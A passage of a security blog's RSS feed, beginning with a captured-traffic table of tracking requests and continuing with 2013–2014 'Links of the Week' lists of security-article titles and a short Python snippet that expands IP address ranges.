      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629497, TSecr 1273499850,POST /api/track.php HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 2/2,[truncated] data=%7B%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22phr%22%3A%7B%7D%2C%22pub%22%3A%2236706X955308%22%2C%22slc%22%3A0%2C%22swc%22%3A0%2C%22js...</td>
    </tr>
    <tr>
      <th>175</th>
      <td> 89860</td>
      <td> t.skimresources.com</td>
      <td>      /api/track.php</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629497, TSecr 1273499850,POST /api/track.php HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 2/2,[truncated] data=%7B%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22phr%22%3A%7B%7D%2C%22pub%22%3A%2236706X955308%22%2C%22slc%22%3A0%2C%22swc%22%3A0%2C%22js...</td>
    </tr>
    <tr>
      <th>176</th>
      <td> 89723</td>
      <td> t.skimresources.com</td>
      <td>           /api/link</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629076, TSecr 1273499825,POST /api/link HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 1/1,[truncated] data=%7B%22pub%22%3A%2236706X955308%22%2C%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22dl%22%3A%5B%22androidpit.com%22%2C%22androidpit.es%22%2C%22a...</td>
    </tr>
    <tr>
      <th>177</th>
      <td> 89723</td>
      <td> t.skimresources.com</td>
      <td>           /api/link</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629076, TSecr 1273499825,POST /api/link HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 1/1,[truncated] data=%7B%22pub%22%3A%2236706X955308%22%2C%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22dl%22%3A%5B%22androidpit.com%22%2C%22androidpit.es%22%2C%22a...</td>
    </tr>
    <tr>
      <th>178</th>
      <td> 89723</td>
      <td> t.skimresources.com</td>
      <td>           /api/link</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629076, TSecr 1273499825,POST /api/link HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 1/1,[truncated] data=%7B%22pub%22%3A%2236706X955308%22%2C%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22dl%22%3A%5B%22androidpit.com%22%2C%22androidpit.es%22%2C%22a...</td>
    </tr>
    <tr>
      <th>179</th>
      <td> 89723</td>
      <td> t.skimresources.com</td>
      <td>           /api/link</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629076, TSecr 1273499825,POST /api/link HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 1/1,[truncated] data=%7B%22pub%22%3A%2236706X955308%22%2C%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22dl%22%3A%5B%22androidpit.com%22%2C%22androidpit.es%22%2C%22a...</td>
    </tr>
    <tr>
      <th>180</th>
      <td> 89860</td>
      <td> t.skimresources.com</td>
      <td>      /api/track.php</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629497, TSecr 1273499850,POST /api/track.php HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 2/2,[truncated] data=%7B%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22phr%22%3A%7B%7D%2C%22pub%22%3A%2236706X955308%22%2C%22slc%22%3A0%2C%22swc%22%3A0%2C%22js...</td>
    </tr>
    <tr>
      <th>181</th>
      <td> 89860</td>
      <td> t.skimresources.com</td>
      <td>      /api/track.php</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629497, TSecr 1273499850,POST /api/track.php HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 2/2,[truncated] data=%7B%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22phr%22%3A%7B%7D%2C%22pub%22%3A%2236706X955308%22%2C%22slc%22%3A0%2C%22swc%22%3A0%2C%22js...</td>
    </tr>
    <tr>
      <th>182</th>
      <td> 89860</td>
      <td> t.skimresources.com</td>
      <td>      /api/track.php</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629497, TSecr 1273499850,POST /api/track.php HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 2/2,[truncated] data=%7B%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22phr%22%3A%7B%7D%2C%22pub%22%3A%2236706X955308%22%2C%22slc%22%3A0%2C%22swc%22%3A0%2C%22js...</td>
    </tr>
    <tr>
      <th>183</th>
      <td> 89860</td>
      <td> t.skimresources.com</td>
      <td>      /api/track.php</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629497, TSecr 1273499850,POST /api/track.php HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 2/2,[truncated] data=%7B%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22phr%22%3A%7B%7D%2C%22pub%22%3A%2236706X955308%22%2C%22slc%22%3A0%2C%22swc%22%3A0%2C%22js...</td>
    </tr>
    <tr>
      <th>184</th>
      <td> 89723</td>
      <td> t.skimresources.com</td>
      <td>           /api/link</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629076, TSecr 1273499825,POST /api/link HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 1/1,[truncated] data=%7B%22pub%22%3A%2236706X955308%22%2C%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22dl%22%3A%5B%22androidpit.com%22%2C%22androidpit.es%22%2C%22a...</td>
    </tr>
    <tr>
      <th>185</th>
      <td> 89723</td>
      <td> t.skimresources.com</td>
      <td>           /api/link</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629076, TSecr 1273499825,POST /api/link HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 1/1,[truncated] data=%7B%22pub%22%3A%2236706X955308%22%2C%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22dl%22%3A%5B%22androidpit.com%22%2C%22androidpit.es%22%2C%22a...</td>
    </tr>
    <tr>
      <th>186</th>
      <td> 89723</td>
      <td> t.skimresources.com</td>
      <td>           /api/link</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629076, TSecr 1273499825,POST /api/link HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 1/1,[truncated] data=%7B%22pub%22%3A%2236706X955308%22%2C%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22dl%22%3A%5B%22androidpit.com%22%2C%22androidpit.es%22%2C%22a...</td>
    </tr>
    <tr>
      <th>187</th>
      <td> 89723</td>
      <td> t.skimresources.com</td>
      <td>           /api/link</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629076, TSecr 1273499825,POST /api/link HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 1/1,[truncated] data=%7B%22pub%22%3A%2236706X955308%22%2C%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22dl%22%3A%5B%22androidpit.com%22%2C%22androidpit.es%22%2C%22a...</td>
    </tr>
    <tr>
      <th>188</th>
      <td> 89860</td>
      <td> t.skimresources.com</td>
      <td>      /api/track.php</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629497, TSecr 1273499850,POST /api/track.php HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 2/2,[truncated] data=%7B%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22phr%22%3A%7B%7D%2C%22pub%22%3A%2236706X955308%22%2C%22slc%22%3A0%2C%22swc%22%3A0%2C%22js...</td>
    </tr>
    <tr>
      <th>189</th>
      <td> 89860</td>
      <td> t.skimresources.com</td>
      <td>      /api/track.php</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629497, TSecr 1273499850,POST /api/track.php HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 2/2,[truncated] data=%7B%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22phr%22%3A%7B%7D%2C%22pub%22%3A%2236706X955308%22%2C%22slc%22%3A0%2C%22swc%22%3A0%2C%22js...</td>
    </tr>
    <tr>
      <th>190</th>
      <td> 89860</td>
      <td> t.skimresources.com</td>
      <td>      /api/track.php</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629497, TSecr 1273499850,POST /api/track.php HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 2/2,[truncated] data=%7B%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22phr%22%3A%7B%7D%2C%22pub%22%3A%2236706X955308%22%2C%22slc%22%3A0%2C%22swc%22%3A0%2C%22js...</td>
    </tr>
    <tr>
      <th>191</th>
      <td> 89860</td>
      <td> t.skimresources.com</td>
      <td>      /api/track.php</td>
      <td>                                                                                                                                                                                                                                                                                                                                None</td>
      <td> No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 44629497, TSecr 1273499850,POST /api/track.php HTTP/1.1\r\n,Origin: http://www.androidpit.de\r\n,X-Requested-With: com.android.browser\r\n,Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7\r\n,\r\n,HTTP request 2/2,[truncated] data=%7B%22pag%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%2C%22phr%22%3A%7B%7D%2C%22pub%22%3A%2236706X955308%22%2C%22slc%22%3A0%2C%22swc%22%3A0%2C%22js...</td>
    </tr>
  </tbody>
</table>
</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 23</title>
      <link>https://blog.dornea.nu/2014/01/17/links-of-the-week-23/</link>
      <pubDate>Fri, 17 Jan 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/01/17/links-of-the-week-23/</guid>
      <content:encoded><![CDATA[<ul>
<li>
<p><a href="www.cs.utexas.edu/lasr/download.php?uid=52">InkTag: Secure Applications on an Untrusted Operating System</a></p>
</li>
<li>
<p><a href="http://websec.github.io/unicode-security-guide/character-transformations/">Unicode Security Guide</a></p>
</li>
<li>
<p><a href="http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Hunting-Botnets-with-ZMap/ba-p/6320865#.Utj-PbRcmf1">Hunting Botnets with ZMap</a></p>
</li>
<li>
<p><a href="https://defuse.ca/audits/encfs.htm">EncFS Security Audit</a></p>
</li>
<li>
<p><a href="http://gexos.github.io/Hacking-Tools-Repository/">Hacking Tools Repository</a></p>
</li>
<li>
<p><a href="http://www.wired.com/underwire/2014/01/movie-fake-code/">The Hacker Who Cracked the Code in <em>Iron Man</em> and <em>The Social Network</em></a></p>
</li>
<li>
<p><a href="http://viralpatel.net/taj/operating-system-tutorial.php">Operating System Tutorials</a></p>
</li>
<li>
<p><a href="http://demythify.com/?p=106">The Jobless Ph.D. Generation</a></p>
</li>
<li>
<p><a href="http://www.inspiration-now.com/holy-book-password-aram-bartholl/">The Holy Book of Passwords by Aram Bartholl</a></p>
</li>
<li>
<p><a href="http://www.illc.uva.nl/Research/Publications/Reports/MoL-2013-23.text.pdf">Reconstructing the Cryptanalytic Attack behind the Flame Malware</a></p>
</li>
<li>
<p><a href="https://www.securelist.com/en/blog/208214185/ChewBacca_a_new_episode_of_Tor_based_Malware">ChewBacca - a new episode of Tor-based Malware</a></p>
</li>
<li>
<p><a href="http://www.reuters.com/article/2013/12/20/us-usa-security-rsa-idUSBRE9BJ1C220131220">Exclusive: Secret contract tied NSA and security industry pioneer</a></p>
</li>
<li>
<p><a href="https://dnscensus2013.neocities.org/">DNS Census 2013</a></p>
</li>
<li>
<p><a href="http://seriouslyappsec.tumblr.com/">Seriously, AppSec?!</a></p>
</li>
<li>
<p><a href="http://ethanheilman.tumblr.com/post/70646748808/a-brief-history-of-nsa-backdoors">A Brief History of NSA Backdoors</a></p>
</li>
<li>
<p><a href="http://www.malwaretech.com/2013/12/peer-to-peer-botnets-for-beginners.html?m=1">Peer-to-Peer Botnets for Beginners</a></p>
</li>
<li>
<p><a href="https://github.com/wandering-nomad/Spidernet">Proof of Concept of SSH Botnet C&amp;C Using Python</a></p>
</li>
<li>
<p><a href="http://blog.klauskiwi.com/wp-content/uploads/2010/08/KVM-Security_en.pdf">KVM Security</a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 22</title>
      <link>https://blog.dornea.nu/2013/12/20/links-of-the-week-22/</link>
      <pubDate>Fri, 20 Dec 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/12/20/links-of-the-week-22/</guid>
      <content:encoded><![CDATA[<ul>
<li>
<p><a href="http://vagosec.org/2013/12/wordpress-rce-exploit/">Remote Code Execution exploit in WordPress 3.5.1</a></p>
</li>
<li>
<p><a href="http://research.zscaler.com/2013/12/dissection-of-android-malware-mouabadp.html">Dissection of Android malware MouaBad.P</a></p>
</li>
<li>
<p><a href="http://www.cyberciti.biz/faq/linux-install-glances-monitoring-tool/">Linux: Keep An Eye On Your System With Glances Monitor</a></p>
</li>
<li>
<p itemprop="name">
  <a href="http://sempersecurus.blogspot.de/2013/12/a-forensic-overview-of-linux-perlbot.html">A Forensic Overview of a Linux perlbot</a>
</p>
</li>
<li>
<p><a href="http://ds9a.nl/amazing-dna/?">DNA seen through the eyes of a code</a>r</p>
</li>
<li>
<p><a href="http://pastebin.com/9vN1ACMH">Infection of biological DNA with digital Computer Code</a></p>
</li>
<li>
<p itemprop="name">
  <a href="http://www.mathyvanhoef.com/2013/12/reversing-and-exploiting-arm-binaries.html?m=1">Reversing and Exploiting ARM Binaries: rwthCTF Trafman</a>
</p>
</li>
<li>
<p><a href="http://www.openbsd.org/papers/ru13-deraadt/">OpenBSD Exploit mitigation techniques</a></p>
</li>
<li>
<p><a href="http://www.cs.tau.ac.il/~tromer/acoustic/"><big>RSA Key Extraction via Low-Bandwidth Acoustic Cryptanalysis</big></a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 21</title>
      <link>https://blog.dornea.nu/2013/12/15/links-of-the-week-21/</link>
      <pubDate>Sun, 15 Dec 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/12/15/links-of-the-week-21/</guid>
      <content:encoded><![CDATA[<ul>
<li>
<p itemprop="name">
  <a href="http://volatility-labs.blogspot.com.es/2012/10/phalanx-2-revealed-using-volatility-to.html">Phalanx 2 Revealed: Using Volatility to Analyze an Advanced Linux Rootkit</a>
</p>
</li>
<li>
<p><a href="http://blog.sucuri.net/2013/12/how-we-decoded-some-nasty-multi-level-encoded-malware.html">How We Decoded Some Nasty Multi-Level Encoded Malware</a></p>
</li>
<li>
<p><a href="http://resources.infosecinstitute.com/layer-7-ddos-attacks-detection-mitigation/">LAYER 7 DDOS ATTACKS: DETECTION &amp; MITIGATION</a></p>
</li>
<li>
<p><a href="https://blog.whitehatsec.com/internet-explorer-xss-filter/">Bypassing Internet Explorers Anti-Cross Site Scripting Filter</a></p>
</li>
<li>
<p><a href="http://www.cs.cmu.edu/~chuck/jokepg/joke_19980216_01.txt">On the 1st of January, 1998, Bjarne Stroustrup gave an interview to the IEEE Computer magazine.</a></p>
</li>
<li>
<p class="crayon-selected">
  <a href="http://hiddenillusion.blogspot.de/2013/12/analyzepdf-bringing-dirt-up-to-surface.html?m=1">AnalyzePDF - Bringing the Dirt Up to the Surface</a>
</p>
</li>
<li>
<p itemprop="name">
  <a href="http://www.danielmiessler.com/study/encoding_encryption_hashing/">The Difference Between Encoding, Encryption, and Hashing</a>
</p>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 20</title>
      <link>https://blog.dornea.nu/2013/12/06/links-of-the-week-20/</link>
      <pubDate>Fri, 06 Dec 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/12/06/links-of-the-week-20/</guid>
      <content:encoded><![CDATA[<ul>
<li><a href="https://www.netspi.com/blog/entryid/209/android-root-detection-techniques">Android Root Detection Techniques</a></li>
<li><a href="https://www.youtube.com/playlist?list=PLiq_fDYFoqMrYqGIQ21vyV7Eod62Jp07d">Shmoocon 2013 Playlist</a></li>
<li><a href="http://www.net-security.org/dl/insecure/INSECURE-Mag-40.pdf">INSECURE Mag 40</a></li>
<li><a href="http://stevegattuso.me/2013/11/30/a-society-of-phone-zombies.html">A society of phone Zombies</a></li>
<li><a href="https://github.com/cryptosphere/cryptosphere">Encrypted peer-to-peer web application platform for decentralized, privacy-preserving applications</a></li>
<li><a href="http://www.freebsd.org/cgi/cvsweb.cgi/~checkout~/src/share/misc/bsd-family-tree?rev=HEAD">The UNIX system family tree: Research and BSD</a></li>
<li><a href="http://arstechnica.com/security/2013/12/found-hacker-server-storing-two-million-pilfered-paswords/">Found: Hacker server storing two million pilfered passwords</a></li>
<li><a href="http://blog.h3xstream.com/2013/12/new-burpzap-plugin-script-generator.html">Burp/Zap plugin: generator script</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Convert IP ranges to list</title>
      <link>https://blog.dornea.nu/2013/12/04/convert-ip-ranges-to-list/</link>
      <pubDate>Wed, 04 Dec 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/12/04/convert-ip-ranges-to-list/</guid>
      <content:encoded><![CDATA[<p>If you got IP ranges in this layout: x.x.x.1-255, y.y.y.42-120 etc., you could easily use this code to generate full IP adresses without any ranges:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ips = &#34;&#34;&#34;
x.x.x.1-23
y.y.y.56-12
&#34;&#34;&#34;

buf = StringIO.StringIO(ips)

while True:
    line = buf.readline()
    if line == &#39;&#39;:
        break
    else:
        import re
        m = re.search(&#39;(.*)\.(.*)\.(.*)\.(.*)&#39;, line)
        if m:
            ip_range = m.group(4).split(&#39;-&#39;)

            if len(ip_range) == 2:
                ip_addr = range(int(ip_range[0]), int(ip_range[1])+1)
                for i in ip_addr:
                    print &#34;%s.%s.%s.%s&#34; % (m.group(1), m.group(2), m.group(3), i)
            else:
                print &#34;%s.%s.%s.%s&#34; % (m.group(1), m.group(2), m.group(3), m.group(4))

</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 19</title>
      <link>https://blog.dornea.nu/2013/11/29/links-of-the-week-19/</link>
      <pubDate>Fri, 29 Nov 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/11/29/links-of-the-week-19/</guid>
      <content:encoded><![CDATA[<li style="text-align: justify;">
  <a href="http://www.langner.com/en/wp-content/uploads/2013/11/To-kill-a-centrifuge.pdf">To kill a centrifuge - A technical anlysis of what Stuxnets creators wanted to achieve</a>
</li>
<li style="text-align: justify;">
  <a href="http://luisbg.blogalia.com/historias/74062">Basic data structures and algorithms in the Linux kernel</a>
</li>
<li style="text-align: justify;">
  <a href="http://dandreamsofcoding.com/2013/09/16/hackers-and-software-engineers/">Hackers and software engineers</a>
</li>
<li style="text-align: justify;">
  <a href="http://www.geheimerkrieg.de/#entry-5-6818-das-projekt">geheimerkrieg.de</a>(also have a look at the <a href="http://mediathek.daserste.de/sendungen_a-z/310918_panorama/18359668_panorama-geheimer-krieg">Videos</a>)
</li>
<li style="text-align: justify;">
  <p id="page-title">
    <a href="http://cyberwarzone.com/cyberwarfare/password-cracking-mega-collection-password-cracking-word-lists">Password cracking: A mega collection of password cracking word lists</a>
  </p>
</li>
<li style="text-align: justify;">
  <a href="http://nayuki.eigenstate.org/page/aes-cipher-internals-in-excel">AES cipher internals in Excel</a>
</li>
<li style="text-align: justify;">
  <a href="http://www.symantec.com/connect/blogs/linux-back-door-uses-covert-communication-protocol">Linux Back Door Uses Covert Communication Protocol</a>
</li>
<li style="text-align: justify;">
  <a href="http://arstechnica.com/security/2013/11/new-linux-worm-targets-routers-cameras-internet-of-things-devices/">New Linux worm targets routers, cameras, Internet of things devices</a>
</li>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 18</title>
      <link>https://blog.dornea.nu/2013/11/22/links-of-the-week-18/</link>
      <pubDate>Fri, 22 Nov 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/11/22/links-of-the-week-18/</guid>
      <content:encoded><![CDATA[<ul>
<li><a href="http://www.alertlogic.com/modern-userland-linux-exploitation-courseware/">Modern Userland Linux Exploitation Courseware</a>: Also have a look at the presentation <a href="http://0dd825819d829ad33679-43ccebb20d316ec4ca572c775d764939.r85.cf2.rackcdn.com/linux_exploitation.odp">slides</a></li>
<li><a href="http://www.utdallas.edu/~shand/papers/elf_carver.pdf">ELF Carver - Recovering Linux Binaries</a></li>
<li><a href="http://www.ru.nl/publish/pages/578936/fvdbroekscriptie.pdf%E2%80%8E">Catching and Understanding GSM-Signals</a></li>
<li><a href="http://resources.infosecinstitute.com/sim-card-forensics-introduction/">SIM Card Forensics: An Introduction</a></li>
<li><a href="http://2013.zeronights.org/materials">ZeroNights 2013 Materials</a></li>
<li><a href="http://exploit-exercises.com/">exploit-exercises.com</a></li>
<li><a href="https://www.eff.org/deeplinks/2013/11/encrypt-web-report-whos-doing-what">Encrypt the Web Report: Who&rsquo;s Doing What</a></li>
<li><a href="http://imgur.com/a/2M17n#0">ELF: A Linux executable walkthrough</a></li>
<li><a href="http://adamjsho.blogspot.co.uk/2013/10/creating-pretty-graphs-in-linux-with.html">Creating pretty graphs in linux with gnuplot</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 17</title>
      <link>https://blog.dornea.nu/2013/11/18/links-of-the-week-17/</link>
      <pubDate>Mon, 18 Nov 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/11/18/links-of-the-week-17/</guid>
      <content:encoded><![CDATA[<ul>
<li><a href="http://www.osnews.com/story/27416/The_second_operating_system_hiding_in_every_mobile_phone">The second operating system hiding in every mobile phone</a></li>
<li><a href="http://blog.nruns.com/blog/2013/11/12/A-portscan-by-email-Alex/">A Portscan by Email - HTTP Over X.509 Revisited</a></li>
<li><a href="http://getpocket.com/redirect?url=http%3A%2F%2Fblog.cmpxchg8b.com%2F2013%2F11%2Fqnx.html">BlackBerry and Windows</a></li>
<li><a href="http://www.masswerk.at/googleBBS/">Google BBS Terminal</a></li>
<li><a href="http://blog.smartbear.com/software-quality/top-10-hacker-movies-of-all-time/">Top 10 Hacker Movies of all time</a></li>
<li><a title="Permanent link to Duplicity + S3: easy, cheap, encrypted, automated full-disk backups for your servers" href="http://blog.phusion.nl/2013/11/11/duplicity-s3-easy-cheap-encrypted-automated-full-disk-backups-for-your-servers/" rel="bookmark">Duplicity + S3: easy, cheap, encrypted, automated full-disk backups for your servers</a></li>
<li><a href="http://de.slideshare.net/HansMichaelVarbaek/botnets-of-the-web-how-to-hijack-one">Botnets of the Web: How to hijack one</a></li>
<li><a href="http://learning.criticalwatch.com/badbios/">badBIOS: analysis of Weapong grade Malware</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 16</title>
      <link>https://blog.dornea.nu/2013/11/08/links-of-the-week-16/</link>
      <pubDate>Fri, 08 Nov 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/11/08/links-of-the-week-16/</guid>
      <content:encoded><![CDATA[<ul>
<li><a href="http://www.saurik.com/id/19">Yet Another Android Master Key Bug</a></li>
<li><a href="http://tmuxp.readthedocs.org/en/latest/about.html">tmuxp - manage tmux workspaces</a></li>
<li><a href="http://www.theguardian.com/world/interactive/2013/nov/01/snowden-nsa-files-surveillance-revelations-decoded#section/1">NSA files: Decoded (really good article)</a></li>
<li><a href="http://fileperms.org/analysis-of-mbrwserstats-counter-php-infected-webserver/">Analysis of an mbr*wserstats and counter.php infected webserver</a></li>
<li><a href="http://captainhooligan.wordpress.com/2013/11/01/leroy-jenkins/">Have fun with Jenkins</a></li>
<li><a href="http://www.netresec.com/?page=Blog&amp;month=2013-10&amp;post=Command-line-Forensics-of-hacked-PHP-net">Commandline forensics of hacked PHP.net</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 15</title>
      <link>https://blog.dornea.nu/2013/11/01/links-of-the-week-15/</link>
      <pubDate>Fri, 01 Nov 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/11/01/links-of-the-week-15/</guid>
      <content:encoded><![CDATA[<ul>
